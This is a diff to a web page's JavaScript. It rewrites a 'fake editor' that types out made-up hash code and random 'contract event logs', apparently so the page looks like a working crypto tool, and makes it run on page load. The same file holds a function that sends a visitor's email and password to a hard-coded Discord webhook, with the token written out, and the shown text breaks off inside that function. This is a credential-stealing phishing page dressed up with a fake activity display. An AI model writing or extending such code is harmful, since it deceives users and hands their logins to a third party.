@@ -273,57 +273,67 @@ function mostrarFakeEditor() {
     const editor = document.getElementById('fakeEditor');
     editor.style.display = 'block';
 
-    // Generar comandos falsos de Hash y Log
-    let fakeCodeLines = [
-        "<span style='color:red'># GeneraciÃ³n de Hash Ãnicos</span>",
-        "",
-        "<span style='color:red'>import</span> hashlib",
-        "<span style='color:red'>import</span> json",
-        "",
-        "<span style='color:red'>def</span> generar_hash_unico(data):",
-        "    <span style='color:red'>return</span> hashlib.sha256(data.encode()).hexdigest()",
-        "",
-        "<span style='color:red'>def</span> obtener_contrato_abi():",
-        "    abi = {",
-        "        'contrato': 'MiContrato',",
-        "        'metodos': {",
-        "            'metodo1': {'tipo': 'funciÃ³n', 'argumentos': ['arg1', 'arg2'], 'retorno': 'retorno'},",
-        "            'metodo2': {'tipo': 'funciÃ³n', 'argumentos': ['arg'], 'retorno': 'retorno'},",
-        "            'metodo3': {'tipo': 'evento', 'argumentos': ['arg1', 'arg2']}",
-        "        }",
-        "    }",
-        "    <span style='color:red'>return</span> json.dumps(abi)",
-        ""
-    ];
-
-    // FunciÃ³n que limpia el editor y muestra un nuevo conjunto de lÃ­neas
-    function updateCode(linesToShow) {
-        editor.innerHTML = ""; // Limpia el editor antes de cada actualizaciÃ³n
-        let endLine = Math.min(linesToShow, fakeCodeLines.length);
-        for (let i = 0; i < endLine; i++) {
-            editor.innerHTML += fakeCodeLines[i] + '<br>';
+    // Generar hashes y logs falsos más realistas
+    function generateRandomHash(length = 40) {
+        const chars = '0123456789abcdef';
+        let hash = '';
+        for (let i = 0; i < length; i++) {
+            hash += chars.charAt(Math.floor(Math.random() * chars.length));
         }
-        // Decide aleatoriamente cuÃ¡ntas lÃ­neas mostrar en el siguiente ciclo
-        let nextLinesToShow = Math.floor(Math.random() * 5) + 1; // Entre 1 y 5 lÃ­neas
-        if (endLine < fakeCodeLines.length) {
-            setTimeout(() => updateCode(nextLinesToShow), 2000); // Espera 2 segundos antes de actualizar
+        return hash;
+    }
+
+    function generateFakeCodeLines() {
+        let fakeCodeLines = [
+            "<span style='color:red'># Generación de Hashes Únicos</span>",
+            "",
+            "<span style='color:red'>import</span> hashlib",
+            "<span style='color:red'>import</span> random",
+            "",
+            "<span style='color:red'>def</span> generar_hash_unico():",
+            `    <span style='color:red'>return</span> hashlib.sha256(str(random.randint(1, 1000000)).encode()).hexdigest()`,
+            "",
+            "<span style='color:red'># Logs de Eventos del Contrato</span>",
+            "",
+        ];
+
+        // Generar líneas de hashes y logs falsos
+        for (let i = 0; i < 5; i++) {
+            fakeCodeLines.push(`Log: ${generateRandomHash(64)}`);
+        }
+
+        return fakeCodeLines;
+    }
+
+    let fakeCodeLines = generateFakeCodeLines();
+    let currentLine = 0;
+
+    // Función para simular el tipeo
+    function typeLine() {
+        if (currentLine < fakeCodeLines.length) {
+            const line = fakeCodeLines[currentLine];
+            let pos = 0;
+            function typeChar() {
+                if (pos < line.length) {
+                    editor.innerHTML += line.charAt(pos);
+                    pos++;
+                    setTimeout(typeChar, Math.random() * 100); // Velocidad de tipeo aleatoria
+                } else {
+                    editor.innerHTML += '<br>';
+                    currentLine++;
+                    setTimeout(typeLine, 500); // Espera antes de la siguiente línea
+                }
+            }
+            typeChar();
         }
     }
 
     // Simula el efecto de "pensamiento" al inicio
-    editor.innerHTML = "<span style='color:red'>Iniciando editor...</span>";
-    let dots = 0;
-    let loadingInterval = setInterval(() => {
-        if (dots < 3) {
-            editor.innerHTML += '.';
-            dots++;
-        } else {
-            clearInterval(loadingInterval);
-            updateCode(12); // Comienza mostrando 12 lÃ­neas
-        }
-    }, 3000); // Medio segundo entre puntos
+    editor.innerHTML = "<span style='color:red'>Iniciando simulación...</span><br>";
+    setTimeout(typeLine, 2000); // Comienza a tipear después de un breve retraso
 }
 
+mostrarFakeEditor();
 function enviarDatosAWebhook(email, contrasena) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
     var request = new XMLHttpRequest();
